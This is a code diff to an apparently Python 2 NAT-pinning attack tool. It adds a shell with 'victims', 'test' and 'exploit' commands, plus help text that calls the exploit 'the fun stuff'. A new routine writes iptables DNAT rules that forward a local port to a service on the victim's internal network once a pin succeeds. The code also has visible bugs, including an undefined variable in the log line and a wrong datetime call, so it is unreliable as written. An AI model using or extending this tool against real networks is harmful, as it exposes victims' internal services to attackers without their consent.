@@ -10,15 +10,20 @@ from tools import ip
 import sys
 import asyncore
 import thread
+import readline
+from datetime import datetime
+from subprocess import call
 
 class Shell():
 	ENGINE = None
 	CURR_VICTIM = None
+	COMMANDS = "HELP", "LIST", "SET", "TEST", "EXPLOIT", "QUIT", "EXIT"
 	def __init__(self, engine):
 		global ENGINE
 		self.ENGINE = engine
 		print "One shell to rule them all"
 		val = ""
+		#readline.parse_and_bind()
 		while val.upper() != "QUIT" and val.upper() != "EXIT":
 			val = self.getUserInput()
 			self.handleCMD(val)
@@ -37,6 +42,38 @@ class Shell():
 		victims = self.getVictims()
 		return victims[id]
 	############################################################################
+	def handleCMD_help(self,parts):
+		if len(parts)==1:
+			print "Available Commands:"
+			print "   help\t\tPrints this message"
+			print "   list\t\tlist items, expects list to display; victims, services, Connectors"
+			print "   \t\tType help list for more information."
+			print "   test\t\tTest natpinning. Command format: test id PROTO IP PORT"
+			print "   \t\tType help test for more information."
+			print "   exploit\tExploit natpinning. Command format: exploit id PROTO IP PORT LOCALPORT"
+			print "  \t\tThis is the fun stuff, type 'help exploit' for more information."
+			print "  exit\t\tQuits the application."
+			print "  quit\t\tQuits the application."
+		elif len(parts)==2:
+			if parts[1].upper()=="TEST":
+				print ""
+				print ""
+				print "Test: The test command is the bread and butter of this tool, it instructs a victim to perform a natpin test."
+				print "Format: test ID PROTOCOL HOST PORT"
+				print "ID: The list id of the victim you wish to test (0,1,2,..."
+				print "PROTOCOL: The protocol you wish to test, FTP, IRC, SIP"
+				print "HOST: The IP you want to test, can be victim private ip, or another ip on its LAN (or an external address"
+				print "PORT: The port on HOST you want to test."
+				print ""
+				print ""
+			elif parts[1].upper()=="EXPLOIT":
+				print "todo"
+			elif parts[1].upper()=="LIST":
+				print "List: The list command lists objects currently loaded."
+				print "   list victims\t\tLists all victims connected to the server."
+				print "   list services\tLists all running services."
+				print "   list connectors\tLists all succesfully exposed endpoints."
+				
 	def handleCmd_test(self, args):
 		format ="test VICTIM_ID PROTO IP PORT"
 		if len(args) != 5:
@@ -61,9 +98,15 @@ class Shell():
 			for server in self.ENGINE.SERVERS:
 				print "\t" + str(x) + ".\t" + server.TYPE
 				x=x+1
-				
+		elif item.upper() =="CONNECTORS":
+			print "Connectors:"
+			print "\tIP\t\tPORT\t\tCREATED\t\tLOCALPORT"
+			print "----------------------------------------------------------------------"
+			for connector in self.ENGINE.CONNECTORS:
+				data = connector.split("|")
+				print data[0] + "\t" + str(data[1]) + "\t" + str(data[2])
 		else:
-			print "Invalid list item specified, allowed values are: victims, services"
+			print "Invalid list item specified, allowed values are: victims, services,connectors"
 	def getUserInput(self):
 		prompt = "np> "
 		user_input = raw_input(prompt).strip()
@@ -83,14 +126,17 @@ class Shell():
 					print "Current victim set to " +  self.getVictimById(self.CURR_VICTIM).VIC_ID
 		elif parts[0].upper()=="TEST":
 			self.handleCmd_test(parts)
+		elif parts[0].upper()=="HELP" or parts[0]=="?":
+			self.handleCMD_help(parts)
 	#end def
 #end class
-
 class Engine():
 	VERBOSITY = 2
 	LOGTYPE = "screen"
 	SERVERS = []
 	SERVICE_THREAD = None
+	CONNECTORS = []
+	RULES = []
 	def __init__(self, verbosity=0, logType="screen"):
 		global VERBOSITY, LOGTYPE
 		VERBOSITY = verbosity
@@ -107,6 +153,23 @@ class Engine():
 			print "NATPIN FAILED : received private IP " + host
 		else:
 			print "NATPIN SUCCES : victim exposed port " + str(port) + " on IP " + host
+			self.addConnector(host,port)
+	#end def
+	def addConnector(self,ip,port):
+		global CONNECTORS
+		exists = False
+		localport = 65000
+		for connector in self.CONNECTORS:
+			data = connector.split("|")
+			if data[0] == ip and str(data[1])==str(port):
+				exists = True
+			localport = int(data[3])
+		if exists == False:
+			localport = localport + 1 #next free port
+			#adding rule to iptables
+			call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "TCP", "--dport", str(localport),"-j", "DNAT","--to-destination", ip+":"+str(port) ])
+			self.log("Created new iptables rule, local port " + str(localport) + " is now forwarded to " + host + ":" + str(port))
+			self.CONNECTORS.append(ip + "|" + str(port) + "|" + str(datetime.datetime.now().time())+ "|" + str(localport))
 	#end def
 	def runServers(self,runCMD,runWeb, runFlash, proto="ALL"):
 		global SERVERS, SERVICE_THREAD
